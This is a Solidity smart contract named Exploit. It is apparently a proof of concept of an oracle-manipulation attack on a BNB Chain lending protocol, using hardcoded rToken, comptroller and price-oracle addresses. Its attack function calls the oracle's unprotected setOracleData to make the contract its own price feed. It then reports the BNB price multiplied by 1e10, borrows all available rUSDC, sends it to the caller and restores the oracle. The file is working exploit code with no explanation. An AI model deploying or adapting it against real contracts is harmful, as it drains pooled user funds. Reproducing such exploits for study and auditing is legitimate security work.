//SPDX-License-Identifier: Unlicense
pragma solidity 0.8.4;

import "./IRToken.sol";
import "./IERC20.sol";
import "./ICointroller.sol";
import "./ISimplePriceOracle.sol";
import "./IPriceFeed.sol";


contract Exploit {
    IRToken rbnb = IRToken(0x157822aC5fa0Efe98daa4b0A55450f4a182C10cA);
    IRToken rusdc = IRToken(0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5);
    ICointroller cointroller = ICointroller(0x4f3e801Bd57dC3D641E72f2774280b21d31F64e4);
    ISimplePriceOracle simplePriceOracle = ISimplePriceOracle(0xD55f01B4B51B7F48912cD8Ca3CDD8070A1a9DBa5);
    IPriceFeed chainlinkBNBUSDPriceFeed = IPriceFeed(0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE);

    constructor(){
        rbnb.approve(address(cointroller),type(uint256).max);
        address[] memory rTokens = new address[](1);
        rTokens[0] = address(rbnb);
        cointroller.enterMarkets(rTokens);
    }

    function attack() external payable{
        rbnb.mint{value:msg.value}();
        simplePriceOracle.setOracleData(address(rbnb),address(this));
        rusdc.borrow(rusdc.getCash());
        IERC20(rusdc.underlying()).transfer(msg.sender,IERC20(rusdc.underlying()).balanceOf(address(this)));
        simplePriceOracle.setOracleData(address(rbnb),address(chainlinkBNBUSDPriceFeed));
    }

    function decimals() external view returns (uint8){
        return chainlinkBNBUSDPriceFeed.decimals();
    }

    function latestRoundData() external view returns (uint80 roundId,int256 answer,uint256 startedAt,uint256 updatedAt,uint80 answeredInRound){
        (roundId,answer,startedAt,updatedAt,answeredInRound) = chainlinkBNBUSDPriceFeed.latestRoundData();
        answer = answer * 1e10;
    }
}